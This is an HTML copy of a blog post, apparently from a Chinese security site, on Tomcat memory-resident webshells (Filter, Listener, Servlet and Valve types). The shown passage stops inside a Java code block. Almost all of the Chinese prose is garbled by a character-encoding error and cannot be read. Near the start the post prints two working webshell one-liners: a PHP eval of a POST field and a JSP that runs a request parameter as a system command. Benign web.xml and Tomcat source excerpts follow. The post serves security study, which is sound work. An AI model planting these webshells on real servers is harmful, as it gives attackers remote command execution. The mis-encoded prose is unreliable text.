<!DOCTYPE html>
<html lang="en-uk" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ÂÜôÂú®ÂâçÈù¢ Êú¨ÊñáÊòØJavaÂÜÖÂ≠òÈ©¨ÁöÑÁ¨¨‰∏ÄÁØáÂÜÖÂÆπÔºåÈÄöËøáÈòÖËØªÊú¨ÊñáÔºåÊàë‰ª¨Â∞Ü‰∏ÄËµ∑‰∫ÜËß£Ôºö Tomcat‰∏≠Ëá™ÂÆö‰πâÁöÑFilter, Listener, Servlet, ValveÊòØÂ¶Ç‰ΩïË¢´Ê≥®ÂÜåÂà∞ÊúçÂä°'><title>JavaSec - ÂÜÖÂ≠òÈ©¨ - Tomcat</title>

<link rel='canonical' href='https://ginkgo.org.cn/posts/javasec_memshell_tomcat/'>

<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='JavaSec - ÂÜÖÂ≠òÈ©¨ - Tomcat'>
<meta property='og:description' content='ÂÜôÂú®ÂâçÈù¢ Êú¨ÊñáÊòØJavaÂÜÖÂ≠òÈ©¨ÁöÑÁ¨¨‰∏ÄÁØáÂÜÖÂÆπÔºåÈÄöËøáÈòÖËØªÊú¨ÊñáÔºåÊàë‰ª¨Â∞Ü‰∏ÄËµ∑‰∫ÜËß£Ôºö Tomcat‰∏≠Ëá™ÂÆö‰πâÁöÑFilter, Listener, Servlet, ValveÊòØÂ¶Ç‰ΩïË¢´Ê≥®ÂÜåÂà∞ÊúçÂä°'>
<meta property='og:url' content='https://ginkgo.org.cn/posts/javasec_memshell_tomcat/'>
<meta property='og:site_name' content='Under The Ginkgo'>
<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='memshell' /><meta property='article:tag' content='java_sec' /><meta property='article:tag' content='tomcat' /><meta property='article:published_time' content='2022-10-25T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-02T18:13:03&#43;08:00'/>
<meta name="twitter:title" content="JavaSec - ÂÜÖÂ≠òÈ©¨ - Tomcat">
<meta name="twitter:description" content="ÂÜôÂú®ÂâçÈù¢ Êú¨ÊñáÊòØJavaÂÜÖÂ≠òÈ©¨ÁöÑÁ¨¨‰∏ÄÁØáÂÜÖÂÆπÔºåÈÄöËøáÈòÖËØªÊú¨ÊñáÔºåÊàë‰ª¨Â∞Ü‰∏ÄËµ∑‰∫ÜËß£Ôºö Tomcat‰∏≠Ëá™ÂÆö‰πâÁöÑFilter, Listener, Servlet, ValveÊòØÂ¶Ç‰ΩïË¢´Ê≥®ÂÜåÂà∞ÊúçÂä°">
    <link rel="shortcut icon" href="/img/favicon.ico" />

<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
}
</script>

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
                            height="237" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üßê</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/medic0803'
                        target="_blank"
                        title="A_GitHub"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='mailto:medicwrf@gmail.com'
                        target="_blank"
                        title="B_E-mail"
                    >
                        
                        
                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/java_sec/" >
                java_sec
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/posts/javasec_memshell_tomcat/">JavaSec - ÂÜÖÂ≠òÈ©¨ - Tomcat</a>
        </h2>
    
        
    </div>

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Oct 25, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    29 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>
</header>

    <section class="article-content">
    
    
    <h2 id="ÂÜôÂú®ÂâçÈù¢">ÂÜôÂú®ÂâçÈù¢</h2>
<p>Êú¨ÊñáÊòØJavaÂÜÖÂ≠òÈ©¨ÁöÑÁ¨¨‰∏ÄÁØáÂÜÖÂÆπÔºåÈÄöËøáÈòÖËØªÊú¨ÊñáÔºåÊàë‰ª¨Â∞Ü‰∏ÄËµ∑‰∫ÜËß£Ôºö <!-- raw HTML omitted --></p>
<ol>
<li>Tomcat‰∏≠Ëá™ÂÆö‰πâÁöÑFilter, Listener, Servlet, ValveÊòØÂ¶Ç‰ΩïË¢´Ê≥®ÂÜåÂà∞ÊúçÂä°Âô®‰∏≠ÁöÑÔºõ <!-- raw HTML omitted --></li>
<li>‰ª•ÂèäTomcatÂú®ÂêØÂä®Êó∂ÊòØÂ¶Ç‰ΩïÂä†ËΩΩÔºåÂú®ÂêØÂä®ÂêéÊòØÂ¶Ç‰ΩïË∞ÉÁî®Ëøô‰∫õÁªÑ‰ª∂ÁöÑÁõ∏ÂÖ≥ÊñπÊ≥ïÁöÑÔºõ <!-- raw HTML omitted --></li>
<li>Filter, Listener, Servlet, ValveÂÜÖÂ≠òÈ©¨ÁöÑÂéüÁêÜ‰ª•ÂèäPOCÔºõ <!-- raw HTML omitted --></li>
</ol>
<p>Âú®ÈòÖËØªÊú¨Êñá‰πãÂâçÔºåÊàñËÄÖÂú®ÈòÖËØª‰∏≠ÈÅáÂà∞‰∏çÊ∏ÖÊ•öÁöÑÊ¶ÇÂøµÊó∂ÔºåÂèØ‰ª•ÁªìÂêàÊàëÁöÑ‰∏ä‰∏ÄÁØáÊñáÁ´†Ôºö<a class="link" href="https://ginkgo.org.cn/posts/javasec_javaweb_tomcat/"  target="_blank" rel="noopener"
    >JavaSec - JavaWeb - Tomcat Ê°ÜÊû∂‰ª•Âèä‰∏éServlet‰πãÈó¥ÁöÑËÅîÁ≥ª</a> Êù•‰Ωú‰∏∫ÂèÇËÄÉÔºå‰πüÂèØ‰ª•ÈòÖËØªËØ•Êñá‰∏≠ÁöÑÂºïÁî®Êù•Ëé∑ÂæóÊõ¥Â•ΩÁöÑÁêÜËß£„ÄÇ <!-- raw HTML omitted --></p>
<h2 id="‰ªÄ‰πàÊòØÂÜÖÂ≠òÈ©¨-Âíå‰∏ÄÂè•ËØùÊú®È©¨Êúâ‰ªÄ‰πàÂå∫Âà´">‰ªÄ‰πàÊòØÂÜÖÂ≠òÈ©¨ÔºüÂíå‰∏ÄÂè•ËØùÊú®È©¨Êúâ‰ªÄ‰πàÂå∫Âà´Ôºü</h2>
<p>Êàë‰ª¨ÂÖàÊù•ÂõûÈ°æ‰∏Ä‰∏ãÊàë‰ª¨ÊúÄÁÜüÊÇâÁöÑ‰∏ÄÂè•ËØùÊú®È©¨Ôºö <!-- raw HTML omitted --></p>
<ul>
<li>PHP‰∏ÄÂè•ËØùÊú®È©¨Ôºö <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><ul>
<li>JSP‰∏ÄÂè•ËØùÊú®È©¨Ôºö <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">));%&gt;</span>
</span></span></code></pre></div><p>Êàë‰ª¨‰ª•ÂâçÈÉΩÊòØ‰∏ÄËà¨ÈÉΩÊòØ‰æùÈù†Êñá‰ª∂‰∏ä‰º†ÔºåÂ∞Ü‰∏ÄÂè•ËØùÊú®È©¨‰∏ä‰º†Âà∞ÊúçÂä°Âô®Á´ØÔºåÊé•ÁùÄÂÜçÁî®ËöÅÂâëÊù•‰∏éÊñá‰ª∂ËøõË°åËøûÊé•‰∫§‰∫íÔºõ <!-- raw HTML omitted --></p>
<p>ËôΩÁÑ∂‰∏ÄÂè•ËØùÊú®È©¨ÈùûÂ∏∏ÁöÑÊñπ‰æøÔºå‰ΩÜÊòØËøôÊ†∑ÁöÑÊñπÊ≥ïÁöÑÁº∫ÁÇπ‰πüÂæàÊòéÊòæÔºåÂ∞±ÊòØ‰ºöÁïô‰∏ãÊñá‰ª∂Êù•ËøõË°å‰∫§‰∫íÔºåËøôÊ†∑ÁöÑÊñá‰ª∂ÂæàÂÆπÊòìË¢´Ê£ÄÊµãÂà†Èô§Ôºõ <!-- raw HTML omitted --></p>
<blockquote>
<p>ÈÇ£ÂÜÖÂ≠òÈ©¨Â∞±‰∏çÈúÄË¶ÅÊñá‰ª∂‰∏ä‰º†‰∫ÜÂêóÔºü <!-- raw HTML omitted --></p>
</blockquote>
<p>ÈÇ£‰πü‰∏çÊòØÔºåÊàë‰ª¨ËøòÊòØÈúÄË¶ÅÁî®Êñá‰ª∂‰∏ä‰º†Êù•‰∏ä‰º†ËÑöÊú¨ÔºåÊé•ÁùÄÊâßË°å‰πãÂêéÔºåÂ∞ÜÊú®È©¨ÁöÑÂÜÖÂÆπÊ≥®ÂÜåÂà∞ÊúçÂä°Âô®ÁöÑÊúçÂä°‰∏äÔºåËøôÊ†∑Êàë‰ª¨ÁöÑÊú®È©¨Â∞±‰ºöÊåÅÁª≠Âú∞‰øùÁïôÂú®ÊúçÂä°Âô®ÁöÑÂÜÖÂ≠òÈáåÔºå‰πüÂ∞±‰∏çÂÆπÊòìË¢´Ê£ÄÊµãÂà†Èô§‰∫Ü„ÄÇ <!-- raw HTML omitted --></p>
<p>Êú¨ÊñáÂ∞±Êù•ÁùÄÈáç‰ªãÁªçTomcatÊúâÂÖ≥ÁöÑÂõõÁßçÂÜÖÂ≠òÈ©¨ÔºöFilter, Listener, Servlet‰ª•ÂèäValveÂõõÁßçÂΩ¢ÊÄÅ„ÄÇ <!-- raw HTML omitted --></p>
<h2 id="filterÂûã">FilterÂûã</h2>
<p>FilterÊòØJava WebÁöÑ‰∏âÂ§ßÁªÑ‰ª∂‰πã‰∏ÄÔºåÂÖ∂ÂäüËÉΩÊòØÂú®ServletË∞ÉÁî® <code>service()</code> ÊñπÊ≥ïÊ≠£ÂºèÂú∞Â§ÑÁêÜËØ∑Ê±Ç‰πãÂâçÔºåÂØπËØ∑Ê±ÇËøõË°åËøáÊª§Ôºàe.g., ÊòØÂê¶Â∑≤ÁªèÁôªÈôÜÔºåÊàñËÄÖÊòØÂê¶Êã•ÊúâËÆøÈóÆÊùÉÈôêÁ≠âÔºâÔºåÂπ∂‰∏î‰ª•Ë¥£‰ªªÈìæÁöÑÂΩ¢ÂºèÔºåÂàõÂª∫‰∏Ä‰∏™FilterChainÊâøËΩΩÂ§ö‰∏™‰∏çÂêåÁöÑFilterÊù•ËøõË°å‰∏çÂêåÁöÑËøáÊª§Êìç‰Ωú„ÄÇ <!-- raw HTML omitted --></p>
<p>FilterÂÜÖÂ≠òÈ©¨ÁöÑÊú¨Ë¥®Â∞±ÊòØÈÄöËøá‰∏ä‰º†‰∏Ä‰∏™JSPÊñá‰ª∂ÔºåÊâßË°åËøô‰∏™JSPÊñá‰ª∂ÂèØ‰ª•ÂêëÊ≠£Âú®ËøêË°åÁöÑTomcatÊúçÂä°Âô®‰∏≠Âä®ÊÄÅÂú∞Âä†ËΩΩ‰∏Ä‰∏™FilterÂÆû‰æãÔºå‰ªéËÄåÂú®ÂØπ‰∫éËØ∑Ê±ÇËøõË°åËøáÊª§ÁöÑÊó∂ÂÄôÊâßË°åÊàë‰ª¨ÊÉ≥Ë¶ÅÊâßË°åÁöÑÊÅ∂ÊÑè‰ª£Á†Å„ÄÇ <!-- raw HTML omitted --></p>
<h3 id="‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑfilterÊòØÂ¶Ç‰ΩïË¢´Âä†ËΩΩ‰ª•Âèä‰ΩøÁî®ÁöÑ">‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑFilterÊòØÂ¶Ç‰ΩïË¢´Âä†ËΩΩ‰ª•Âèä‰ΩøÁî®ÁöÑÔºü</h3>
<ul>
<li>‰ªéweb.xml‰∏≠Ë¢´Âä†ËΩΩÔºåconfigureContext()‰∏≠ <!-- raw HTML omitted --></li>
<li>startInternal()Ë¢´ÂàùÂßãÂåñÂíåÂä†ËΩΩ <!-- raw HTML omitted -->
<ul>
<li>Â≠òÊîæÂú®ÂêÑÁßçHahsMap‰∏≠ <!-- raw HTML omitted --></li>
</ul>
</li>
<li>Ë∞ÉÁî®Êó∂Ë¢´FilterChain‰ΩøÁî® <!-- raw HTML omitted --></li>
</ul>
<p>Âú®Êàë‰ª¨Âè¶ËæüËπäÂæÑ‰πãÂâçÔºåÂÖàÊù•‰∏ÄËµ∑ÁúãÁúãÁ®ãÂ∫èÂëòÂú®ÂºÄÂèëÁöÑËøáÁ®ã‰∏≠ÔºåÊòØÂ¶Ç‰ΩïÊ≠£Â∏∏Âú∞Â∞Ü‰∏Ä‰∏™FilterÊ≥®ÂÜåÂà∞TomcatÊúçÂä°Âô®‰∏≠ÔºåÂπ∂Â¶Ç‰ΩïÂú®ËØ∑Ê±ÇÁöÑÂ§ÑÁêÜ‰∏≠ÂèëÊå•‰ΩúÁî®ÁöÑÔºõ <!-- raw HTML omitted --></p>
<h4 id="ÂºÄÂèëËá™ÂÆö‰πâfilterÁ±ª">ÂºÄÂèëËá™ÂÆö‰πâFilterÁ±ª</h4>
<p>È¶ñÂÖàÔºåÊàë‰ª¨ÈúÄË¶ÅÊñ∞Âª∫‰∏Ä‰∏™FilterÁ±ªÔºåÂÆÉÈúÄË¶ÅÂÆûÁé∞FilterÊé•Âè£Âπ∂ÂÆûÁé∞Êé•Âè£‰∏≠ÁöÑÊñπÊ≥ïÔºö <strong>doFilter()</strong>; <!-- raw HTML omitted --></p>
<p>‰∏ãÈù¢Êàë‰ª¨ÂÆö‰πâ‰∫Ü‰∏Ä‰∏™FilterÂè´ÂÅöHelloFilter, ÂêåÊó∂ÈáçÂÜô‰∫ÜdofilterÊñπÊ≥ïÔºåË¶ÅÊ±ÇÂÆ¢Êà∑Á´ØÂèëÊù•ÁöÑËØ∑Ê±ÇÔºåÈúÄË¶ÅÂåÖÂê´userËøô‰∏™Â≠óÊÆµÔºàË°®Á§∫Â∑≤ÁªèÁôªÈôÜÔºâÔºåÂê¶ÂàôÂ∞±‰ºöË∑≥ËΩ¨Âà∞ <strong>/login.jsp</strong> È°µÈù¢ÂéªËøõË°åÁôªÈôÜ„ÄÇÂ¶ÇÊûúÂ∑≤ÁªèÁôªÈôÜÔºåÂàôË∞ÉÁî®FilterChain#doFilter()ÊñπÊ≥ïÔºåÂéªÊâßË°å‰∏ã‰∏Ä‰∏™FilterÁöÑËøáÊª§Êìç‰Ωú„ÄÇ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-25_09-50-21_screenshot.png"
         alt="Figure 1: HelloFilterËøáÊª§Âô®" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted -->HelloFilterËøáÊª§Âô®</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>Êé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶Å‰øÆÊîπ <strong>web.xml</strong> ÈÖçÁΩÆÊñá‰ª∂ÔºåÂ∞ÜËøô‰∏™Êñ∞Âª∫ÁöÑFilterÊ≥®ÂÜåÂà∞TomcatÊúçÂä°Âô®‰∏≠ÔºåÈÇ£‰πàÂú®‰∏ã‰∏ÄÊ¨°Ë∞ÉÁî®‰∏≠Ëøô‰∏™FilterÂ∞±ÂèØ‰ª•Ëµ∑Êïà‰∫ÜÔºö <!-- raw HTML omitted --></p>
<ol>
<li>
<p>&lt;filter&gt;ÂÖÉÁ¥†ÂÆö‰πâ‰∫ÜFilterÁöÑÂêçÂ≠ó‰ª•ÂèäÁúüÂÆûÁöÑÁ±ªÂêç; <!-- raw HTML omitted --></p>
</li>
<li>
<p>&lt;filter-mapping&gt;ÂàôÂÆö‰∫ÜÈúÄË¶ÅËøáÊª§ÁöÑËØ∑Ê±ÇËåÉÂõ¥ÔºåÊØîÂ¶ÇËøôÈáåÁöÑ <code>/admin/*</code> Â∞±Ë°®Á§∫ <code>/admin/</code> ÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÁöÑÊñá‰ª∂ÁöÑËÆøÈóÆÈÉΩÈúÄË¶ÅÁªèËøáËøáÊª§ÔºàÈÉΩÈúÄË¶ÅÁôªÈôÜÔºâÔºõ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;filter&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-name&gt;</span>HelloFilter<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-class&gt;</span>pers.javasec.javafilter.HelloFilter<span class="nt">&lt;/filter-class&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/filter&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-name&gt;</span>HelloFilter<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;url-pattern&gt;</span>/admin/*<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/filter-mapping&gt;</span>
</span></span></code></pre></div></li>
</ol>
<p>Ëá≥Ê≠§Ôºå‰∏Ä‰∏™FilterÂ∞±Â∑≤ÁªèÊ≥®ÂÜåÁªìÊùü‰∫ÜÔºå‰∏ã‰∏ÄÊ¨°ÂêØÂä®Tomcat‰πãÂêéÔºåËøô‰∏™FilterÂ∞±‰ºöÂºÄÂßãÊãÖË¥üËøáÊª§Â∑•‰ΩúÔºõ <!-- raw HTML omitted --></p>
<p>Êé•ÁùÄÊàë‰ª¨Êù•ÁúãËøô‰∏™FilterÊòØÂ¶Ç‰ΩïË¢´TomcatÊâÄÂä†ËΩΩÔºåÂàùÂßãÂåñ‰ª•ÂèäÂú®ËØ∑Ê±ÇÁöÑËøáÊª§‰∏≠ÂèëÊå•‰ΩúÁî®ÁöÑÔºõ <!-- raw HTML omitted --></p>
<h4 id="tomcatÂú®ÂêØÂä®Êó∂Âä†ËΩΩfilter">TomcatÂú®ÂêØÂä®Êó∂Âä†ËΩΩFilter</h4>
<p>TomcatÂú®ÂêØÂä®‰πãÂêé‰ºöÈÄöËøáContextConfig#configureContext()ÊñπÊ≥ïÂ∞Ü <strong>web.xml</strong> ‰∏≠ÁöÑÊâÄÊúâÈÖçÁΩÆ‰ø°ÊÅØËØªÂèñÂπ∂ËøõË°å‰øùÂ≠òÔºåÊàë‰ª¨ËøôÈáå‰ªÖÊèêÂèñ‰∫ÜFilterÁöÑÈÉ®ÂàÜÔºö <!-- raw HTML omitted --></p>
<ol>
<li>ËøôÈáåÁöÑcontextÊåáÁöÑÊòØTomcatÁöÑContainerÂÆπÂô®ÔºåÂÆûÁé∞Á±ª‰∏∫StandardContextÔºåÂÖ∑‰ΩìËØ∑ÂèÇËÄÉTomcatÊ°ÜÊû∂ÊñáÁ´†ÔºåËøôÈáå‰∏çÂÜçËµòËø∞Ôºõ <!-- raw HTML omitted --></li>
<li>web.xml‰∏≠ÁöÑ&lt;filter&gt;Ê†áÁ≠æÁöÑÂÜÖÂÆπ‰∏≠ÁöÑÈÖçÁΩÆ‰ø°ÊÅØ‰ºö‰ª• <code>FilterDef</code> ÁöÑÂΩ¢ÂºèË¢´Tomcat‰øùÂ≠òÔºõ <!-- raw HTML omitted --></li>
<li>&lt;filter-mapping&gt;Ê†áÁ≠æÁöÑÂÜÖÂÆπÂàô‰ª• <code>FilterMap</code> ÁöÑÂΩ¢ÂºèË¢´‰øùÂ≠òÔºõ <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">configureContext</span><span class="o">(</span><span class="n">WebXml</span> <span class="n">webxml</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Âä†ËΩΩFilterÁöÑÈÖçÁΩÆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="o">(</span><span class="n">FilterDef</span> <span class="n">filter</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getFilters</span><span class="o">().</span><span class="na">values</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">filter</span><span class="o">.</span><span class="na">getAsyncSupported</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">filter</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span><span class="s">&#34;false&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">context</span><span class="o">.</span><span class="na">addFilterDef</span><span class="o">(</span><span class="n">filter</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
